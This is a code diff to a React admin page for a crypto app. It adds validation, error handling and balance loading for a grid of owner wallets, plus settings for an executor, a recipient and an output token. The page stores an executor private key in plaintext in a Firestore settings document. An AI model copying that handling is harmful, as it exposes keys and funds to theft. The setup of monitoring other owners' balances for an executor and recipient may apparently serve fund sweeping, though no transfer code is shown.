@@ -21,7 +21,7 @@ export default function Admin() {
   const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
   const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');
   const [recipientAddressSetting, setRecipientAddressSetting] = useState(HARDCODED_EXECUTOR);
-  const [minRequiredBalanceSetting, setMinRequiredBalanceSetting] = useState(100);
+  const [minRequiredBalanceSetting, setMinRequiredBalanceSetting] = useState('100');
 
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [isModalOpen, setIsModalOpen] = useState(false);
@@ -43,17 +43,20 @@ export default function Admin() {
       const tokenVal = s.tokenAddress || outputToken;
       const privKeyVal = s.executorPrivateKey || '';
       const recipientVal = s.recipientAddress || HARDCODED_EXECUTOR;
-      const minVal = Number(s.minRequiredBalance);
+      const minVal = s.minRequiredBalance !== undefined && s.minRequiredBalance !== null 
+        ? String(s.minRequiredBalance) 
+        : '100';
 
       setExecutorAddressSetting(execVal);
       setExecutorPrivateKeySetting(privKeyVal);
       setOutputToken(tokenVal);
       setRecipientAddressSetting(recipientVal);
       setRecipient(recipientVal);
-      setMinRequiredBalanceSetting(Number.isFinite(minVal) ? minVal : 100);
+      setMinRequiredBalanceSetting(minVal);
       setSettingsStatus('Loaded');
     } catch (err) {
-      setSettingsStatus('Load failed');
+      console.error('Settings load error:', err);
+      setSettingsStatus('Load failed: ' + err.message);
     } finally {
       setSettingsLoading(false);
     }
@@ -63,20 +66,39 @@ export default function Admin() {
     setSettingsLoading(true);
     setSettingsStatus('Saving...');
     try {
-      const parsedMin = Number(minRequiredBalanceSetting);
-      const minRequiredBalance = Number.isFinite(parsedMin) ? parsedMin : undefined;
+      // Validate required fields
+      if (!executorAddressSetting?.trim()) {
+        throw new Error('Executor Address is required');
+      }
+      if (!recipientAddressSetting?.trim()) {
+        throw new Error('Recipient Address is required');
+      }
+      if (!outputToken?.trim()) {
+        throw new Error('Output Token Address is required');
+      }
 
-      await setDoc(docRef(db, 'admin_config', 'settings'), {
-        executorAddress: executorAddressSetting,
-        executorPrivateKey: executorPrivateKeySetting || undefined,
-        recipientAddress: recipientAddressSetting,
-        tokenAddress: outputToken,
-        minRequiredBalance
-      }, { merge: true });
+      const parsedMin = Number(minRequiredBalanceSetting);
+      const minRequiredBalance = Number.isFinite(parsedMin) && parsedMin >= 0 ? parsedMin : 100;
+
+      const settingsData = {
+        executorAddress: executorAddressSetting.trim(),
+        recipientAddress: recipientAddressSetting.trim(),
+        tokenAddress: outputToken.trim(),
+        minRequiredBalance: minRequiredBalance,
+        updatedAt: new Date().toISOString()
+      };
+
+      // Only include private key if provided
+      if (executorPrivateKeySetting?.trim()) {
+        settingsData.executorPrivateKey = executorPrivateKeySetting.trim();
+      }
+
+      await setDoc(docRef(db, 'admin_config', 'settings'), settingsData, { merge: true });
       setRecipient(recipientAddressSetting);
       setSettingsStatus('Saved successfully');
       setTimeout(() => setSettingsStatus(''), 3000);
     } catch (err) {
+      console.error('Settings save error:', err);
       setSettingsStatus('Save failed: ' + err.message);
     } finally {
       setSettingsLoading(false);
@@ -101,6 +123,8 @@ export default function Admin() {
 
   const [balances, setBalances] = useState({});
   const [tokenBalances, setTokenBalances] = useState({});
+  const [balancesLoading, setBalancesLoading] = useState(false);
+  const [balancesError, setBalancesError] = useState('');
   const [executorEthBalance, setExecutorEthBalance] = useState('—');
   const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
   const [tokenSymbol, setTokenSymbol] = useState('TOKEN');
@@ -155,65 +179,94 @@ export default function Admin() {
     if (!owners.length) {
       setBalances({});
       setTokenBalances({});
+      setBalancesLoading(false);
       return () => { mounted = false; };
     }
+
+    setBalancesLoading(true);
+    setBalancesError('');
 
     (async () => {
       const next = {};
       const nextToken = {};
-      const provider = getReadProvider();
-      let tokenContract = null;
-      let decimals = tokenDecimals;
-
+      
       try {
-        tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
-        decimals = Number(await tokenContract.decimals());
-        if (mounted) setTokenDecimals(decimals);
-      } catch (e) {
-        // keep existing tokenDecimals
-      }
+        const provider = getReadProvider();
+        let tokenContract = null;
+        let decimals = tokenDecimals;
 
-      await Promise.all(owners.map(async (owner) => {
-        try {
-          const b = await provider.getBalance(owner);
-          next[owner] = Number(formatUnits(b, 18)).toFixed(4);
-        } catch {
-          next[owner] = '—';
+        // Validate token address before attempting to create contract
+        if (tokenAddress && tokenAddress !== '0x0000000000000000000000000000000000000000') {
+          try {
+            tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
+            decimals = Number(await tokenContract.decimals());
+            if (mounted) setTokenDecimals(decimals);
+          } catch (e) {
+            console.error('Failed to load token contract:', e);
+            if (mounted) setBalancesError('Invalid token address');
+          }
         }
 
-        try {
-          if (tokenContract) {
-            const tb = await tokenContract.balanceOf(owner);
-            nextToken[owner] = Number(formatUnits(tb, decimals)).toFixed(4);
-          } else {
+        // Fetch balances for all owners
+        await Promise.all(owners.map(async (owner) => {
+          try {
+            const b = await provider.getBalance(owner);
+            next[owner] = Number(formatUnits(b, 18)).toFixed(4);
+          } catch (err) {
+            console.error(`Failed to fetch ETH balance for ${owner}:`, err);
+            next[owner] = '—';
+          }
+
+          try {
+            if (tokenContract) {
+              const tb = await tokenContract.balanceOf(owner);
+              nextToken[owner] = Number(formatUnits(tb, decimals)).toFixed(4);
+            } else {
+              nextToken[owner] = '—';
+            }
+          } catch (err) {
+            console.error(`Failed to fetch token balance for ${owner}:`, err);
             nextToken[owner] = '—';
           }
-        } catch {
-          nextToken[owner] = '—';
-        }
-      }));
+        }));
 
-      if (mounted) {
-        setBalances(next);
-        setTokenBalances(nextToken);
+        if (mounted) {
+          setBalances(next);
+          setTokenBalances(nextToken);
+          setBalancesLoading(false);
+        }
+      } catch (err) {
+        console.error('Balance fetch error:', err);
+        if (mounted) {
+          setBalancesError('Failed to load balances');
+          setBalancesLoading(false);
+        }
       }
     })();
 
+    // Fetch executor balances separately
     (async () => {
       try {
         const provider = getReadProvider();
         const eb = await provider.getBalance(EXECUTOR_ADDRESS_UI);
-        setExecutorEthBalance(Number(formatUnits(eb, 18)).toFixed(4));
-      } catch {
-        setExecutorEthBalance('—');
+        if (mounted) setExecutorEthBalance(Number(formatUnits(eb, 18)).toFixed(4));
+      } catch (err) {
+        console.error('Failed to fetch executor ETH balance:', err);
+        if (mounted) setExecutorEthBalance('—');
       }
+      
       try {
         const provider = getReadProvider();
-        const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
-        const tb = await tokenContract.balanceOf(EXECUTOR_ADDRESS_UI);
-        setExecutorTokenBalance(Number(formatUnits(tb, tokenDecimals)).toFixed(4));
-      } catch {
-        setExecutorTokenBalance('—');
+        if (tokenAddress && tokenAddress !== '0x0000000000000000000000000000000000000000') {
+          const tokenContract = new Contract(tokenAddress, ERC20_ABI, provider);
+          const tb = await tokenContract.balanceOf(EXECUTOR_ADDRESS_UI);
+          if (mounted) setExecutorTokenBalance(Number(formatUnits(tb, tokenDecimals)).toFixed(4));
+        } else {
+          if (mounted) setExecutorTokenBalance('—');
+        }
+      } catch (err) {
+        console.error('Failed to fetch executor token balance:', err);
+        if (mounted) setExecutorTokenBalance('—');
       }
     })();
 
@@ -285,8 +338,13 @@ export default function Admin() {
           className="w-full px-3 text-gray-700 py-2 border rounded-md"
           value={outputToken}
           onChange={(e) => setOutputToken(e.target.value)}
-          placeholder="Output Token Address"
+          placeholder="Output Token Address (e.g., 0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2)"
         />
+        <p className="text-xs text-gray-500 mt-2">
+          {outputToken && outputToken !== '0x0000000000000000000000000000000000000000' 
+            ? '✓ Token address set' 
+            : '⚠ No token address - balances will not load'}
+        </p>
       </div>
 
       {/* Executor Balance */}
@@ -310,10 +368,23 @@ export default function Admin() {
 
       {/* Wallets Grid */}
       <div className="grid grid-cols-1 text-gray-700 md:grid-cols-2 lg:grid-cols-3 gap-6">
+        {balancesError && (
+          <div className="col-span-full bg-red-50 border border-red-300 rounded-lg p-4 text-red-800">
+            ⚠️ {balancesError}
+            {tokenAddress === '0x0000000000000000000000000000000000000000' && (
+              <p className="text-sm mt-2">Please set a valid Output Token Address in Global Settings</p>
+            )}
+          </div>
+        )}
+        {balancesLoading && (
+          <div className="col-span-full bg-blue-50 border border-blue-300 rounded-lg p-4 text-blue-800">
+            ⟳ Loading wallet balances...
+          </div>
+        )}
         {Object.keys(groupedData).map(owner => (
           <div
             key={owner}
-            className="bg-white border shadow-sm rounded-lg p-5 text-gray-700 cursor-pointer hover:shadow-md"
+            className="bg-white border shadow-sm rounded-lg p-5 text-gray-700 cursor-pointer hover:shadow-md transition-shadow"
             onClick={() => openModal(owner)}
           >
             <div className="font-mono text-gray-700 text-sm">
@@ -321,7 +392,7 @@ export default function Admin() {
             </div>
 
             <div className="mt-3 text-gray-900 font-bold">
-              {balances[owner]} ETH • {tokenBalances[owner]} {tokenSymbol}
+              {balances[owner] !== undefined ? balances[owner] : '—'} ETH • {tokenBalances[owner] !== undefined ? tokenBalances[owner] : '—'} {tokenSymbol}
             </div>
 
             <div className="mt-4 flex justify-between text-sm text-gray-800">
@@ -483,7 +554,7 @@ export default function Admin() {
                   min="0"
                   step="0.01"
                   value={minRequiredBalanceSetting}
-                  onChange={e => setMinRequiredBalanceSetting(e.target.value)}
+                  onChange={e => setMinRequiredBalanceSetting(e.target.value || '0')}
                   className="w-full px-3 py-2 border rounded text-sm"
                   placeholder="100"
                 />
